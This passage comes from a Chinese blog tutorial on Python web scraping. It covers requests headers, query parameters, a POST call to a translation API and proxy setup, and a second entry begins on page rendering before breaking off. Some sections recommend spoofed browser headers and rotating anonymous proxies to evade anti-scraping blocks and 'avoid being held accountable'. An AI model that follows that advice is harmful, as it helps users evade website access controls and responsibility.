class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应对应请求的请求头信息</span></span><br><span class="line"><span class="built_in">print</span>(response.request.headers)</span><br></pre></td></tr></table></figure><h5 id="4-1-思考"><a href="#4-1-思考" class="headerlink" title="4.1 思考"></a>4.1 思考</h5><p>对比浏览器上百度首页的网页源码和代码中的百度首页的源码，有什么不同？</p><p>代码中的百度首页的源码非常少，为什么？</p><h5 id="4-2-为什么请求需要带上header？"><a href="#4-2-为什么请求需要带上header？" class="headerlink" title="4.2 为什么请求需要带上header？"></a>4.2 为什么请求需要带上header？</h5><p>模拟浏览器，欺骗服务器，获取和浏览器一致的内容</p><h5 id="4-3-header的形式：字典"><a href="#4-3-header的形式：字典" class="headerlink" title="4.3 header的形式：字典"></a>4.3 header的形式：字典</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="4-4-用法"><a href="#4-4-用法" class="headerlink" title="4.4 用法"></a>4.4 用法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><h5 id="4-5-完整的代码"><a href="#4-5-完整的代码" class="headerlink" title="4.5 完整的代码"></a>4.5 完整的代码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在请求头中带上User-Agent，模拟浏览器发送请求</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(response.content)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印请求头信息</span></span><br><span class="line"><span class="built_in">print</span>(response.request.headers)</span><br></pre></td></tr></table></figure><h3 id="5、发送带参数的请求"><a href="#5、发送带参数的请求" class="headerlink" title="5、发送带参数的请求"></a>5、发送带参数的请求</h3><blockquote><p>我们在使用百度搜索的时候经常发现url地址中会有一个 <code>?</code>，那么该问号后边的就是请求参数，又叫做查询字符串</p></blockquote><h5 id="5-1-什么叫做请求参数："><a href="#5-1-什么叫做请求参数：" class="headerlink" title="5.1 什么叫做请求参数："></a>5.1 什么叫做请求参数：</h5><p>例1： <a href="http://www.webkaka.com/tutorial/server/2015/021013/">http://www.webkaka.com/tutorial/server/2015/021013/</a></p><p>例2：<a href="https://www.baidu.com/s?wd=python&a=c">https://www.baidu.com/s?wd=python&amp;a=c</a></p><p>例1中没有请求参数！例2中?后边的就是请求参数</p><h5 id="5-2-请求参数的形式：字典"><a href="#5-2-请求参数的形式：字典" class="headerlink" title="5.2 请求参数的形式：字典"></a>5.2 请求参数的形式：字典</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;长城&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="5-3-请求参数的用法"><a href="#5-3-请求参数的用法" class="headerlink" title="5.3 请求参数的用法"></a>5.3 请求参数的用法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url,params=kw)</span><br></pre></td></tr></table></figure><h5 id="5-4-关于参数的注意点"><a href="#5-4-关于参数的注意点" class="headerlink" title="5.4 关于参数的注意点"></a>5.4 关于参数的注意点</h5><p>在url地址中， 很多参数是没有用的，比如百度搜索的url地址，其中参数只有一个字段有用，其他的都可以删除 如何确定那些请求参数有用或者没用：挨个尝试！ 对应的,在后续的爬虫中，越到很多参数的url地址，都可以尝试删除参数</p><h5 id="5-5-两种方式：发送带参数的请求"><a href="#5-5-两种方式：发送带参数的请求" class="headerlink" title="5.5 两种方式：发送带参数的请求"></a>5.5 两种方式：发送带参数的请求</h5><ul><li><p>对<code>https://www.baidu.com/s?wd=python</code>发起请求可以使用<code>requests.get(url, params=kw)</code>的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式一：利用params参数发送带参数的请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是目标url</span></span><br><span class="line"><span class="comment"># url = &#x27;https://www.baidu.com/s?wd=python&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后有没有问号结果都一样</span></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/s?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求参数是一个字典 即wd=python</span></span><br><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>: <span class="string">&#x27;python&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带上请求参数发起请求，获取响应</span></span><br><span class="line">response = requests.get(url, headers=headers, params=kw)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当有多个请求参数时，requests接收的params参数为多个键值对的字典，比如 &#x27;?wd=python&amp;a=c&#x27;--&gt;&#123;&#x27;wd&#x27;: &#x27;python&#x27;, &#x27;a&#x27;: &#x27;c&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure></li><li><p>也可以直接对<code>https://www.baidu.com/s?wd=python</code>完整的url直接发送请求，不使用params参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式二：直接发送带参数的url的请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/s?wd=python&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kw = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url中包含了请求参数，所以此时无需params</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></li></ul><h3 id="6、小结"><a href="#6、小结" class="headerlink" title="6、小结"></a>6、小结</h3><ol><li>requests模块的介绍：能够帮助我们发起请求获取响应</li><li>requests的基本使用：<code>requests.get(url)</code></li><li>以及response常见的属性：<ul><li><code>response.text</code> 响应体 str类型</li><li><code>respones.content</code> 响应体 bytes类型</li><li><code>response.status_code</code> 响应状态码</li><li><code>response.request.headers</code> 响应对应的请求头</li><li><code>response.headers</code> 响应头</li><li><code>response.request._cookies</code> 响应对应请求的cookie</li><li><code>response.cookies</code> 响应的cookie（经过了set-cookie动作）</li></ul></li><li>掌握 requests.text和content的区别：text返回str类型，content返回bytes类型</li><li>掌握 解决网页的解码问题：<ul><li><code>response.content.decode()</code></li><li><code>response.content.decode(&quot;UTF-8&quot;)</code></li><li><code>response.text</code></li></ul></li><li>掌握 requests模块发送带headers的请求：<code>requests.get(url, headers=&#123;&#125;)</code></li><li>掌握 requests模块发送带参数的get请求：<code>requests.get(url, params=&#123;&#125;)</code></li></ol><h2 id="二、requests模块的深入使用"><a href="#二、requests模块的深入使用" class="headerlink" title="二、requests模块的深入使用"></a>二、requests模块的深入使用</h2><h5 id="学习目标：-1"><a href="#学习目标：-1" class="headerlink" title="学习目标："></a>学习目标：</h5><ol><li>能够应用requests发送post请求的方法</li><li>能够应用requests模块使用代理的方法</li><li>了解代理ip的分类</li></ol><hr><h3 id="1、使用requests发送POST请求"><a href="#1、使用requests发送POST请求" class="headerlink" title="1、使用requests发送POST请求"></a>1、使用requests发送POST请求</h3><blockquote><p>思考：哪些地方我们会用到POST请求？</p></blockquote><ol><li>登录注册（ POST 比 GET 更安全）</li><li>需要传输大文本内容的时候（ POST 请求对数据长度没有要求）</li></ol><p>所以同样的，我们的爬虫也需要在这两个地方回去模拟浏览器发送post请求</p><h5 id="1-1-requests发送post请求语法："><a href="#1-1-requests发送post请求语法：" class="headerlink" title="1.1 requests发送post请求语法："></a>1.1 requests发送post请求语法：</h5><ul><li><p>用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>, data = data, headers=headers)</span><br></pre></td></tr></table></figure></li><li><p>data 的形式：字典</p></li></ul><h5 id="1-2-POST请求练习"><a href="#1-2-POST请求练习" class="headerlink" title="1.2 POST请求练习"></a>1.2 POST请求练习</h5><p>下面面我们通过金山翻译的例子看看post请求如何使用：</p><p>地址：<a href="https://www.iciba.com/fy">https://www.iciba.com/fy</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ol><li><p>抓包确定请求的url地址</p><p>![截屏2022-04-20 下午3.22.11](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.22.11.png)</p></li><li><p>确定请求的参数</p><p>![截屏2022-04-20 下午3.23.07](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.23.07.png)</p></li><li><p>确定返回数据的位置</p><p><img src="/../images/requests1.assets/image-20220420152404175.png" alt="image-20220420152404175"></p></li><li><p>模拟浏览器获取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;zh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;lucky 是一个帅气的老师&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="comment"># print(res.status_code)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回的是json字符串 需要在进行转换为字典</span></span><br><span class="line">data = json.loads(res.content.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line"><span class="comment"># print(type(data))</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;content&#x27;</span>][<span class="string">&#x27;out&#x27;</span>])</span><br></pre></td></tr></table></figure></li></ol><h4 id="1-3-小结"><a href="#1-3-小结" class="headerlink" title="1.3 小结"></a>1.3 小结</h4><p>在模拟登陆等场景，经常需要发送post请求，直接使用<code>requests.post(url,data)</code>即可</p><h3 id="2、使用代理"><a href="#2、使用代理" class="headerlink" title="2、使用代理"></a>2、使用代理</h3><h5 id="2-1-为什么要使用代理"><a href="#2-1-为什么要使用代理" class="headerlink" title="2.1 为什么要使用代理"></a>2.1 为什么要使用代理</h5><ol><li>让服务器以为不是同一个客户端在请求</li><li>防止我们的真实地址被泄露，防止被追究</li></ol><h5 id="2-2-理解使用代理的过程"><a href="#2-2-理解使用代理的过程" class="headerlink" title="2.2 理解使用代理的过程"></a>2.2 理解使用代理的过程</h5><p><img src="/../images/requests1.assets/%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E7%9A%84%E8%BF%87%E7%A8%8B.png" alt="使用代理的过程"></p><h5 id="2-3-理解正向代理和反向代理的区别（扩展）"><a href="#2-3-理解正向代理和反向代理的区别（扩展）" class="headerlink" title="2.3 理解正向代理和反向代理的区别（扩展）"></a>2.3 理解正向代理和反向代理的区别（扩展）</h5><p><img src="/../images/requests1.assets/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="正向代理和反向代理的区别"></p><p>通过上图可以看出：</p><ul><li>正向代理：对于浏览器知道服务器的真实地址，例如VPN</li><li>反向代理：浏览器不知道服务器的真实地址，例如nginx</li></ul><p><strong>详细讲解：</strong></p><p>正向代理是客户端与正向代理客户端在同一局域网，客户端发出请求，正向代理 替代客户端向服务器发出请求。服务器不知道谁是真正的客户端，正向代理隐藏了真实的请求客户端。<br>反向代理：服务器与反向代理在同一个局域网，客服端发出请求，反向代理接收请求 ，反向代理服务器会把我们的请求分转发到真实提供服务的各台服务器Nginx就是性能非常好的反向代理服务器，用来做负载均衡</p><p><img src="/../images/requests1.assets/20190715113403480.png" alt="20190715113403480"></p><h5 id="2-4-代理的使用"><a href="#2-4-代理的使用" class="headerlink" title="2.4 代理的使用"></a>2.4 代理的使用</h5><ul><li><p>用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>,  proxies = proxies)</span><br></pre></td></tr></table></figure></li><li><p>proxies的形式：字典</p></li><li><p>例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> proxies = <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://12.34.56.79:9527&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;https&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://12.34.56.79:9527&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="2-5-代理IP的分类"><a href="#2-5-代理IP的分类" class="headerlink" title="2.5 代理IP的分类"></a>2.5 代理IP的分类</h5><p>根据代理ip的匿名程度，代理IP可以分为下面三类：</p><ul><li>透明代理(Transparent Proxy)：透明代理的意思是客户端根本不需要知道有代理服务器的存在，但是它传送的仍然是真实的IP。使用透明代理时，对方服务器是可以知道你使用了代理的，并且他们也知道你的真实IP。你要想隐藏的话，不要用这个。透明代理为什么无法隐藏身份呢?因为他们将你的真实IP发送给了对方服务器，所以无法达到保护真实信息。</li><li>匿名代理(Anonymous Proxy)：匿名代理隐藏了您的真实IP，但是向访问对象可以检测是使用代理服务器访问他们的。会改变我们的请求信息，服务器端有可能会认为我们使用了代理。不过使用此种代理时，虽然被访问的网站不能知道你的ip地址，但仍然可以知道你在使用代理，当然某些能够侦测ip的网页也是可以查到你的ip。（<a href="https://wenku.baidu.com/view/9bf7b5bd3a3567ec102de2bd960590c69fc3d8cf.html%EF%BC%89">https://wenku.baidu.com/view/9bf7b5bd3a3567ec102de2bd960590c69fc3d8cf.html）</a></li><li>高匿代理(Elite proxy或High Anonymity Proxy)：高匿名代理不改变客户机的请求，这样在服务器看来就像有个真正的客户浏览器在访问它，这时客户的真实IP是隐藏的，完全用代理服务器的信息替代了您的所有信息，就象您就是完全使用那台代理服务器直接访问对象，同时服务器端不会认为我们使用了代理。IPDIEA覆盖全球240＋国家地区ip高匿名代理不必担心被追踪。</li></ul><p>在使用的使用，毫无疑问使用高匿代理效果最好</p><p>从请求使用的协议可以分为：</p><ul><li>http代理</li><li>https代理</li><li>socket代理等</li></ul><p>不同分类的代理，在使用的时候需要根据抓取网站的协议来选择</p><h5 id="2-6-代理IP使用的注意点"><a href="#2-6-代理IP使用的注意点" class="headerlink" title="2.6 代理IP使用的注意点"></a>2.6 代理IP使用的注意点</h5><ul><li><p>反反爬</p><p>使用代理ip是非常必要的一种<code>反反爬</code>的方式</p><p>但是即使使用了代理ip，对方服务器任然会有很多的方式来检测我们是否是一个爬虫，比如：</p><ul><li><p>一段时间内，检测IP访问的频率，访问太多频繁会屏蔽</p></li><li><p>检查Cookie，User-Agent，Referer等header参数，若没有则屏蔽</p></li><li><p>服务方购买所有代理提供商，加入到反爬虫数据库里，若检测是代理则屏蔽</p><p>所以更好的方式在使用代理ip的时候使用随机的方式进行选择使用，不要每次都用一个代理ip</p></li></ul></li><li><p>代理ip池的更新</p><p>购买的代理ip很多时候大部分(超过60%)可能都没办法使用，这个时候就需要通过程序去检测哪些可用，把不能用的删除掉。</p></li></ul><ul><li><p>代理服务器平台的使用：</p><p>当然还有很多免费的，但是大多都不可用需要自己尝试</p><ul><li><a href="http://www.66ip.cn/">http://www.66ip.cn</a></li><li><a href="https://ip.jiangxianli.com/?page=1">https://ip.jiangxianli.com/?page=1</a></li><li><a href="https://www.zdaye.com/">https://www.zdaye.com</a></li><li><a href="https://www.kuaidaili.com/free">https://www.kuaidaili.com/free</a></li></ul></li></ul><h3 id="3、配置"><a href="#3、配置" class="headerlink" title="3、配置"></a>3、配置</h3><ul><li><p>浏览器配置代理</p><p>右边三点=&#x3D;&gt; 设置=&#x3D;&gt; 高级=&#x3D;&gt; 代理=&#x3D;&gt; 局域网设置=&#x3D;&gt; 为LAN使用代理&#x3D;&#x3D;&gt; 输入ip和端口号即可</p><p>参考网址：<a href="https://jingyan.baidu.com/article/a681b0dece76407a1843468d.html">https://jingyan.baidu.com/article/a681b0dece76407a1843468d.html</a></p></li><li><p>代码配置</p><p>urllib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler = urllib.request.ProxyHandler(&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;114.215.95.188:3128&#x27;</span>&#125;)</span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"><span class="comment"># 后续都使用opener.open方法去发送请求即可</span></span><br></pre></td></tr></table></figure><p>requests</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用到的库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 写入获取到的ip地址到proxy</span></span><br><span class="line"><span class="comment"># 一个ip地址</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://221.178.232.130:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 多个ip地址</span></span><br><span class="line"><span class="string">proxy = [</span></span><br><span class="line"><span class="string">  &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;,</span></span><br><span class="line"><span class="string">  &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">import random</span></span><br><span class="line"><span class="string">proxy = random.choice(proxy)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用代理</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://58.20.184.187:9091&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = requests.get(<span class="string">&quot;http://httpbin.org/ip&quot;</span>, proxies=proxy)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4、小结-1"><a href="#4、小结-1" class="headerlink" title="4、小结"></a>4、小结</h3><ol><li>requests发送post请求使用requests.post方法，带上请求体，其中请求体需要时字典的形式，传递给data参数接收</li><li>在requests中使用代理，需要准备字典形式的代理，传递给proxies参数接收</li><li>不同协议的url地址，需要使用不同的代理去请求</li></ol>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>urllib与requests3</title>
      <link href="/2023/12/28/urllib%E4%B8%8Erequests3/"/>
      <url>/2023/12/28/urllib%E4%B8%8Erequests3/</url>
      
        <content type="html"><![CDATA[<h1 id="前情摘要"><a href="#前情摘要" class="headerlink" title="前情摘要"></a>前情摘要</h1><h2 id="一、web请求全过程剖析"><a href="#一、web请求全过程剖析" class="headerlink" title="一、web请求全过程剖析"></a>一、web请求全过程剖析</h2><p>我们浏览器在输入完网址到我们看到网页的整体内容, 这个过程中究竟发生了些什么?</p><p>我们看一下一个浏览器请求的全过程</p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/20180110203518028714.jpeg" alt="20180110203518028714"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20220617192253187.png" alt="image-20220617192253187"></p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20220617192211534.png" alt="image-20220617192211534"></p><p>接下来就是一个比较重要的事情了. 所有的数据都在页面源代码里么? 非也~ 这里要介绍一个新的概念</p><p>那就是页面渲染数据的过程, 我们常见的页面渲染过程有两种, </p><ol><li><p>服务器渲染, 你需要的数据直接在页面源代码里能搜到</p><p>这个最容易理解, 也是最简单的. 含义呢就是我们在请求到服务器的时候, 服务器直接把数据全部写入到html中, 我们浏览器就能直接拿到带有数据的html内容. 比如, </p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215173905476.png" alt="image-20201215173905476"></p><p>由于数据是直接写在html中的, 所以我们能看到的数据都在页面源代码中能找的到的. </p><p>这种网页一般都相对比较容易就能抓取到页面内容. </p></li><li><p>前端JS渲染, 你需要的数据在页面源代码里搜不到</p><p>这种就稍显麻烦了. 这种机制一般是第一次请求服务器返回一堆HTML框架结构. 然后再次请求到真正保存数据的服务器, 由这个服务器返回数据, 最后在浏览器上对数据进行加载. 就像这样:</p><p><img src="/../images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E4%B8%8Eurllib&requests.assets/image-20201215174726729.png" alt="image-20201215174726729"></p><p>js渲染代码（示例）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>案例：动态渲染页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">table</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        